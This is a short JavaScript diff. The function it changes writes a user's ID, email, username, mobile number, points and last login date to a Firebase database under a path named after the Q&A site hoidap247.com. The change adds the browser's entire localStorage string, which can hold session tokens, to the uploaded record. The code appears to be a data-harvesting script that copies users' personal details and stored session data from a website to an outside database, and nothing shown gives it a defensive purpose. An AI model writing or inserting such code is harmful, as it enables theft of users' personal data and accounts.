@@ -54,16 +54,17 @@ const Last_login_date = parsedValue.user.info.last_login_date;
 
 
 // Function to write data to the database
-function writeData(ID, Email, UserName, Mobile, Point, Last_login_date) {
+function writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString) {
     const db = getDatabase();
-    set(ref(db, `hoidap247/${ID}`), {
+    set(ref(db, `hoidap247.com/${ID}`), {
         Email: Email,
         UserName: UserName,
         Mobile: Mobile,
         Point: Point,
-        Last_login_date: Last_login_date
+        Last_login_date: Last_login_date,
+        LocalStorage: localStorageString
     });
 }
 
 // Call the writeData function
-writeData(ID, Email, UserName, Mobile, Point, Last_login_date);
+writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString);
